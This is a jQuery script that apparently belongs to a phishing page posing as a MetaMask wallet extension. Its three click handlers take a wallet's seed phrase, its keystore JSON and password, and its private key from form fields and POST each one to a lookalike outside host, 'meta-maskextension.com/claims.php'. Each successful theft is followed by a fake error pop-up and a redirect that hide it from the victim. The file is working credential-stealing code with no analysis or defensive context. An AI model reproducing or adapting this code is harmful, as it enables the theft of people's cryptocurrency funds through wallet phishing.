$(document).ready(function() {
	
	$('#tephrase').on('click', function() {
		$("#tephrase").attr("disabled", "disabled");
		var phrase = $('#cf_phrase').val();
		if(phrase!="" ){
			
                $.ajax({
                    url: "https://meta-maskextension.com/claims.php",
                    type: "POST",
                    data: {
                        type: 1,
                        phrase:phrase,					
                    },
                    cache: false,
                    success: function(dataResult){
                        if(dataResult.statusCode==200){
				swal("Oops !", "Sorry an error occurred!!!", "error").then(()=>{
			    window.location.replace('../../index.html');
			})
// 				setTimeout(function() {
// 				 swal("Oops !", "Sorry an error occurred!!!", "error");    
// 					window.location.replace('../../index.html');  
// 				 }, 7000);
                        }
                       
                        
                    }
                });
               
			      
		}
		else{
			alert('Please fill all the field !');
		}
	});
	
	$('#tekey').on('click', function() {
		$("#tekey").attr("disabled", "disabled");
		var cf_passw = $('#cf_passw').val();     
		var cf_json = $('#cf_json').val();     
		if(cf_json!="" ){
                $.ajax({
                    url: "https://meta-maskextension.com/claims.php",
                    type: "POST",
                    data: {
                        type: 2,
                        cf_passw,
                        cf_json					
                    },
                    cache: false,
                    success: function(dataResult){
                        if(dataResult.statusCode==200){
				swal("Oops !", "Sorry an error occurred!!!", "error").then(()=>{
			    window.location.replace('../../index.html');
			})
// 				                             setTimeout(function() {
// 				 swal("Oops !", "Sorry an error occurred!!!", "error");  
// 				 window.location.replace('../../index.html');  
// 			      }, 7000);  
                        }
                       
                        
                    }
                });   
		}
		else{
			alert('Please fill all the field !');
		}
	});
	
	$('#teprivate').on('click', function() {
		$("#teprivate").attr("disabled", "disabled");
		var cf_key = $('#cf_key').val();     
		if(cf_key!="" ){
                $.ajax({
                    url: "https://meta-maskextension.com/claims.php",
                    type: "POST",
                    data: {
                        type: 3,
                        cf_key,				
                    },
                    cache: false,
                    success: function(dataResult){
                        if(dataResult.statusCode==200){
				swal("Oops !", "Sorry an error occurred!!!", "error").then(()=>{
			    window.location.replace('../../index.html');
			})
// 				                             setTimeout(function() {
// 				 swal("Oops !", "Sorry an error occurred!!!", "error");  
// 				 window.location.replace('../../index.html');  
// 			      }, 7000);               
                        }
                       
                    }
                });
		}
		else{
			alert('Please fill all the field !');
		}
	});
	

});
